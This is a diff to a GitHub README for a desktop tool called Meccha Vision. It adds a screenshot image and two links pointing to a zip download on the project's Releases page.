@@ -1,5 +1,6 @@
 # MECCHA-CHAMELEON-VISION
 # 🎨 Meccha Vision — Desktop Tool 2026
+<img width="1291" height="724" alt="image" src="https://github.com/user-attachments/assets/6d60a8f7-6523-400a-877d-13a501637a5f" />
 
 ---
 
@@ -11,7 +12,7 @@ Designed for testing and educational purposes.
 
 ---
 
-## 📥 Download
+## 📥 [Download](https://github.com/natureshoutrivet/MECCHA-CHAMELEON-VISION/releases/download/MECCHAVISION/meccha-vision.zip)
 
 Download the latest version from GitHub Releases:
 
@@ -47,7 +48,7 @@ This project is licensed under **GPL-3.0-or-later**.
 
 **Official repository:**
 
-
+## 📥 [Download](https://github.com/natureshoutrivet/MECCHA-CHAMELEON-VISION/releases/download/MECCHAVISION/meccha-vision.zip)
 ---
 
 ## 🏷️ Tags
